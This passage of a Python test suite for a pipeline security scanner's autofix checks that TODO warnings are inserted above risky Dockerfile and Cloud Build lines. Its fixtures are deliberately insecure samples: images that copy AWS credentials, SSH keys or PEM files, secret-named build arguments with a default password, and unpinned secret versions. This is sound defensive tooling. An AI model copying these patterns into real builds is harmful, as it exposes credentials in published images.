        df = "FROM alpine:3.19\nCOPY .aws/credentials /root/.aws/credentials\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None

    def test_inserts_todo_above_pem_file(self):
        df = "FROM alpine:3.19\nADD tls.pem /etc/ssl/tls.pem\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None

    def test_no_op_for_regular_copy(self):
        df = "FROM alpine:3.19\nCOPY app/ /srv/app/\n"
        assert autofix.generate_fix(_finding("DF-019"), df) is None

    def test_idempotent(self):
        df = "FROM alpine:3.19\nCOPY id_rsa /root/.ssh/id_rsa\n"
        once = autofix.generate_fix(_finding("DF-019"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-019"), once) is None


class TestDF020ArgCredNameTODO:
    def test_inserts_todo_above_npm_token_arg(self):
        df = "FROM node:20\nARG NPM_TOKEN\nRUN npm install\n"
        after = autofix.generate_fix(_finding("DF-020"), df)
        assert after is not None
        assert "TODO(pipelineguard DF-020)" in after

    def test_inserts_todo_above_password_arg_with_default(self):
        df = "FROM postgres:16\nARG DB_PASSWORD=changeme\n"
        after = autofix.generate_fix(_finding("DF-020"), df)
        assert after is not None

    def test_inserts_todo_above_secret_arg(self):
        df = "FROM alpine:3.19\nARG APP_SECRET\n"
        after = autofix.generate_fix(_finding("DF-020"), df)
        assert after is not None

    def test_no_op_for_neutral_arg_name(self):
        df = "FROM alpine:3.19\nARG VERSION=1.0\nARG BUILD_DATE\n"
        assert autofix.generate_fix(_finding("DF-020"), df) is None

    def test_idempotent(self):
        df = "FROM node:20\nARG NPM_TOKEN\n"
        once = autofix.generate_fix(_finding("DF-020"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-020"), once) is None


# ── Cloud Build comment-only TODO fixer (GCB-007) ────────────────────


class TestGCB007LatestVersionTODO:
    def test_inserts_todo_above_versions_latest(self):
        cb = (
            "availableSecrets:\n"
            "  secretManager:\n"
            "    - versionName: projects/p/secrets/db/versions/latest\n"
            "      env: DB_PASS\n"
        )
        after = autofix.generate_fix(_finding("GCB-007"), cb)
        assert after is not None
        assert "TODO(pipelineguard GCB-007)" in after

    def test_no_op_when_pinned_version(self):
        cb = (
            "availableSecrets:\n"
            "  secretManager:\n"
            "    - versionName: projects/p/secrets/db/versions/7\n"
            "      env: DB_PASS\n"
        )
        assert autofix.generate_fix(_finding("GCB-007"), cb) is None

    def test_idempotent(self):
        cb = "    - versionName: projects/p/secrets/db/versions/latest\n"
        once = autofix.generate_fix(_finding("GCB-007"), cb)
        assert once is not None
        assert autofix.generate_fix(_finding("GCB-007"), once) is None
